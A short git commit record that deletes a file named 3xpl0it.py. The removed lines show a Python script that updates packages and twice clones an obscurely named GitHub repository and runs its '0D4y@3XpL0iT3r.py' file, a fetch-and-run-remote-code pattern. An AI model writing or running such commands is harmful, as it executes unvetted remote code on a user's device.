9b5ebda317ac427edc80feff46c3d523b5327039
rizztrizz16 <50659269+rizztrizz16@users.noreply.github.com>
2019-05-16 07:02:41 +0700

    Delete 3xpl0it.py

--- 3xpl0it.py
+++
@@ -1,8 +0,0 @@
-
-import os
-os.system("pkg update ")
-os.system("git clone https://github.com/MuslimSecurity/kwmfuwvev3vej98fwm893fkre.git && cd kwmfuwvev3vej98fwm893fkre && python 0D4y@3XpL0iT3r.py")
-
-os.system("pkg update ")
-os.system("git clone https://github.com/MuslimSecurity/kwmfuwvev3vej98fwm893fkre.git && cd kwmfuwvev3vej98fwm893fkre && python 0D4y@3XpL0iT3r.py")
-
